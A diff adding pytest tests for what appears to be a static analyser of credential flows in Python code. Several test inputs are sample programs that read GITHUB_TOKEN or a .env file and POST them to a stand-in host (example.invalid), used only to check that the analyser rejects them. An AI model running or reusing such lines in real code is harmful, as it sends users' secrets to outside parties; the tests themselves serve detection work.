@@ -162,3 +162,34 @@ def test_supported_literal_concatenation_at_limit_stays_available():
     # Inputs stay below8,000 characters while the propagated value reaches it.
     program = 'a="' + 'x' * 4000 + '"\na=a+a\n'
     assert f.observe(program)['state'] == 'NO_SUPPORTED_FLOW'
+
+
+@pytest.mark.parametrize('program',[
+    'import os, requests\n__debug__=os.environ["GITHUB_TOKEN"]\nrequests.post("https://example.invalid",data=__debug__)',
+    '__debug__="ordinary"',
+    'import requests as __debug__\nfrom pathlib import Path\n__debug__.post("https://example.invalid",data=Path(".env").read_text())',
+    'import os as __debug__\nimport requests\nrequests.post("https://example.invalid",data=__debug__.environ["GITHUB_TOKEN"])',
+    'from pathlib import Path as __debug__\nimport requests\nrequests.post("https://example.invalid",data=__debug__(".env").read_text())',
+])
+def test_reserved_bindings_rejected_by_real_compiler_never_yield_observation(program):
+    with pytest.raises(SyntaxError):compile(program,'<owned synthetic compiler control>','exec')
+    with pytest.raises(CorpusError):f.observe(program)
+
+
+def test_unsupported_or_excessive_profile_is_refused_before_compile(monkeypatch):
+    def forbidden_compile(*args,**kwargs):raise AssertionError('Unsupported profile reached semantic compiler')
+    # ast.parse itself legitimately calls builtins.compile; patch only the final
+    # semantic-validation name inside this method's globals.
+    monkeypatch.setattr(f,'compile',forbidden_compile,raising=False)
+    for program in ('if True:\n pass','a="x"\n'+'a=a+a\n'*17):
+        with pytest.raises(CorpusError):f.observe(program)
+
+
+def test_real_cli_does_not_emit_native_parser_warning_fragments():
+    # Valid Python can carry an invalid-escape SyntaxWarning. Keep its supported
+    # static semantics without printing inspected-source diagnostic fragments.
+    program='label="SYNTHETIC_PRIVATE_CANARY\\q"\npass\n'
+    run=subprocess.run([sys.executable,'-I','-S','-B',str(ROOT/'scripts/credential-flow.py')],
+                       input=program.encode(),capture_output=True,timeout=5)
+    assert run.returncode==0 and not run.stderr and json.loads(run.stdout)['state']=='NO_SUPPORTED_FLOW'
+    assert b'SYNTHETIC_PRIVATE_CANARY' not in run.stdout
